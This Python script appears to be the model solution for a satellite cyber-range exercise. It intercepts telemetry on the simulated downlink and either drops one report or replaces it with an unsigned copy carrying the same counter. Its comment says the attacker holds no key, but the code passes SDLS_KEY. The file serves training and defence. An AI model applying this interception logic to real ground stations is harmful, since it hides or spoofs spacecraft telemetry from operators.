#!/usr/bin/env python3
"""EX-D02 model solution: take one report away, and leave nothing where it was.

The other solvers in this range transmit. This one does not have to: it sits between the
spacecraft and the operator and decides what arrives.

That position is not a fiction invented for the exercise. It is where a compromised ground-segment
front end sits - a scheduler, a demodulator's output handler, anything between the antenna and the
console - and it is the same supply-chain position EX-G01 attacks. A jammer has less precision
than this and a compromised ground segment has more; the lesson does not depend on which.

Two modes, and the second is the interesting one:

    --drop      deny one report. The operator's counter shows a gap, IF they are checking one.
    --replace   deny it and put one carrying the same counter in its place. The gap closes.

`--replace` needs the ground station not to be verifying signatures, and that is the finding: the
gap check and the signature check are not two independent mitigations. The first only works on
input the second has vouched for.

Usage: run it from inside the range's shell; it attaches to the channel the operator uses.
"""
import argparse
import sys
import time
from pathlib import Path

REPO = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(REPO / "src"))

from cuberange import ports                                        # noqa: E402
from cuberange.channel.link_channel import LinkChannel             # noqa: E402
from cuberange.identity import spacecraft                          # noqa: E402
from cuberange.keys import SDLS_KEY                                # noqa: E402
from cuberange.proto import pus_auth                               # noqa: E402
from cuberange.proto.frame import decode_tm_frame, encode_tm_frame  # noqa: E402


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    mode = ap.add_mutually_exclusive_group()
    mode.add_argument("--drop", action="store_true", help="deny one report and leave the hole")
    mode.add_argument("--replace", action="store_true",
                      help="deny it and fill the hole with one carrying the same counter")
    ap.add_argument("--nth", type=int, default=2, help="which report to take (default: the 2nd)")
    ap.add_argument("--seconds", type=float, default=60.0, help="how long to sit on the link")
    args = ap.parse_args()
    if not (args.drop or args.replace):
        args.drop = True

    sat = spacecraft(0)
    state = {"n": 0, "taken": None}

    def decide(frame: bytes) -> bool:
        state["n"] += 1
        if state["n"] != args.nth:
            return True
        state["taken"] = frame
        print(f"  took report {args.nth}: {len(frame)} octets")
        return False

    channel = LinkChannel(listen_port=ports.channel(0), sat_port=ports.link(0),
                          downlink_filter=decide).start()
    print(f"  on the link between the operator and satellite 0, taking report {args.nth}")
    try:
        deadline = time.time() + args.seconds
        while time.time() < deadline:
            time.sleep(0.5)
            if args.replace and state["taken"] is not None:
                mc, vc, payload = decode_tm_frame(state["taken"], expect_scid=sat.scid)
                #: The trailer comes off. The attacker has no key - and against a station that
                #: does not require one, does not need it. The counter inside is the spacecraft's
                #: own, which is what closes the gap.
                inner = pus_auth.verify(payload, key=SDLS_KEY).packet
                channel.transmit_to_ground(
                    encode_tm_frame(inner, mc_count=mc, vc_count=vc, scid=sat.scid))
                print("  put one back carrying the same counter, with no trailer")
                state["taken"] = None
    except KeyboardInterrupt:
        pass
    finally:
        print(f"  suppressed {len(channel.suppressed)} frame(s)")
        channel.stop()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
